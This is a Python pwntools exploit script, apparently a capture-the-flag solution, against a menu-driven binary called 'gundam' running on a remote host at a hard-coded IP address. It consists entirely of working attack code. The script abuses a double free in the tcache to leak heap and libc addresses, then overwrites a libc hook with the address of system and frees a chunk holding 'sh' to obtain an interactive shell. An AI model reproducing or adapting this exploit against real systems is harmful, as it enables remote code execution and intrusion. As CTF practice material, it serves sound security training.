from pwn import *

#r = process(["./gundam"],env={"LD_PRELOAD":"./libc.so.6"})
#r = process(["./gundam"])
r = remote("47.75.37.114", 9999)
def build(name,type):
	r.sendlineafter(":","1")
	r.sendafter(":",name)
	r.sendlineafter(":",str(type))

def visit():
	r.sendlineafter(":","2")

def remove(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))

def blow():
	r.sendlineafter(":","4")

build("a",0)
build("a",0)
remove(0)
remove(1)
build("\x40",0)

visit()
r.recvuntil("[2] :")
heap = u64(r.recvuntil("T")[:-1].ljust(8,'\x00'))-0x240
r.recvuntil(":")
print hex(heap)

remove(2)
blow()

for i in range(5):
	if i==1:
		build(p64(0x541)*0x15,0)
	build(p64(0x41)*0x15,0)


for i in range(5):
	remove(5-i)

blow()

build("a",0)
remove(0)
remove(0)
build(p64(heap+0x4e0),0)
build("a",0)
build(p64(0x0)+p64(heap+0x2a0),0)
build("a",0)
remove(0)
build("a",0)

visit()
r.recvuntil("[6] :")
libc = u64(r.recvuntil("T")[:-1].ljust(8,'\x00'))-0x3dac61
r.recvuntil(":")
print hex(libc)
#r.interactive()
for i in range(9):
	remove(i)
blow()
build("a",0)
build("a",0)
remove(1)
remove(1)


build(p64(libc+0x3dc8a8),0)
build("sh\x00a",0)
build(p64(libc+0x47dc0),0)
remove(4)
r.interactive()
